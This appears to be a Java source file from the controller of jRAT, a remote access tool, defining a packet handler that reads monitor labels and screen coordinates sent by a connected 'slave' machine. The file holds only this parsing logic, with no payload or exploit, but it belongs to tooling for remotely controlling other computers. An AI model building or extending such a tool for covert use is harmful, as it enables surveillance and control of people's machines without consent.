package jrat.controller.packets.incoming;

import graphslib.monitors.RemoteMonitor;
import jrat.controller.Slave;


public class Packet18InitMonitors extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int len = slave.readInt();

		slave.setMonitors(new RemoteMonitor[len]);

		for (int i = 0; i < len; i++) {			
			String label = slave.readLine();
			int x = slave.readInt();
			int y = slave.readInt();
			int width = slave.readInt();
			int height = slave.readInt();

			RemoteMonitor monitor = new RemoteMonitor(label, x, y, width, height);

			slave.getMonitors()[i] = monitor;
		}

	}
}
